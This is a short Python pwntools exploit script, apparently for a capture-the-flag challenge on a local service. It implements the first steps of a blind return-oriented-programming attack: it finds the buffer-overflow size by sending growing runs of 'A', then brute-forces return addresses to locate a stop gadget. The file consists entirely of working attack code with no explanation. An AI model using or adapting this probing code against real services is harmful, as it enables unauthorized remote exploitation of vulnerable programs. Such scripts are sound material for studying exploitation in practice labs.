from pwn import *
 
ip = '127.0.0.1'
port = 10001

base = 0x400000
 
def find_stop_gadget(size):
    p = log.progress("Searching for Stop gadget ") 

    for offset in range(1,0x1000):
        addr = int(base + offset)
         
        payload = ''
        payload += 'A' * size
        payload += p64(addr)
         
        if offset % 0x100 == 0:
            log.info(" Progressed to 0x%x" % offset)
 
        try:
            r = remote(ip,port,level='error')
            r.recvuntil('WelCome my friend,Do you know password?\n')
            r.send(payload)
            response  = r.recv(timeout=0.2)
            r.close()
 
            if 'WelCome my friend,Do you know password?' in response:
                p.success("Done")
                log.info("Stop address: " +  hex(addr))
                return addr
        except Exception as e:
            r.close()

def check_Overflow():
    for i in range(1,4096):
        try:
            r = remote(ip,port,level='error')
            response = r.recvuntil('WelCome my friend,Do you know password?\n')           
            r.send("A" * i)
            response = r.recv()
            r.close()
            if 'No password, no game' in response:
                i += 1
            else:
                r.close()
                return i
 
        except EOFError as e:
            r.close()
            return i - 1
 

size = check_Overflow()
log.info('Overflow size : ' + str(size))
find_stop_gadget(size)
